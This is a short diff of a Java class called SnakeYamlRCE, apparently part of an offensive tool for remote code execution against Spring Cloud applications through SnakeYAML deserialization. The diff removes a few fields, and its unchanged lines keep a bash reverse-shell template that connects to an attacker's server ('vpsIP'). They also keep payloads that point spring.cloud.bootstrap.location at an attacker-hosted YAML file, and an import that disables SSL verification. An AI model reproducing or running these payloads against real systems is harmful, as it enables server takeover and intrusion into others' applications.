@@ -21,8 +21,6 @@ import static src.main.SSLVerify.sslVer.disableSSLVerification;
 public class SnakeYamlRCE {
     private String address;
     private String vpsIP;
-    private String vpsPORT;
-    private String args;
     public String text;
     public static  int count= 9950;
     public static  int count1 = 0;
@@ -33,7 +31,6 @@ public class SnakeYamlRCE {
             "  ]]\n" +
             "]";
     public String cmdtmp = "bash -i >& /dev/tcp/%s/%d 0>&1";
-    public String expData = "";
     public String expdata1 = "spring.cloud.bootstrap.location=http://%s/SnakeYamlYml.yml";
     public String expdata2 = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/SnakeYamlYml.yml\"}";
     public SnakeYamlRCE(String address, String vpsIP){
